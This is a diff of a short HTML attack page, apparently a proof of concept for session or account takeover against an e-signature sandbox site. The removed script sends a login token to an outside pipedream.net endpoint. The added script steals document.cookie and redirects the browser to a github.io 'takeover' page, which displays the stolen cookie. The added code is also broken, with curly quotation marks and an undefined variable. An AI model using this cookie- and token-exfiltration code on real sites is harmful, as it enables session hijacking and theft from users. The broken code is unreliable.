@@ -2,12 +2,16 @@
 <html>
   <body>
 <script>
-var token = document.location.hash.substr(2).split("&")[0];
-var url = "https://sandbox.esignlive.com/a/login?" + token + "&target=https://sandbox.esignlive.com/a/";
-alert(url);
-var x = new XMLHttpRequest();
-x.open("GET","https://eomt5u4olr9vnjc.m.pipedream.net?open="+url,false);
-x.send();
+if(location.host == “tamaytandiran.github.io”){ 
+    Url = new URL(document.location); 
+    Parameters = new URLSearchParams(x.search); 
+    cookie = Parameters.get(“cookie”); 
+    document.write(cookie);
+}
+else{ 
+    var cookie = document.cookie; 
+document.location=“https://tamaytandiran.github.io/takeover.html?cookie="+cookie;
+}
 </script>
 </body>
 </html>
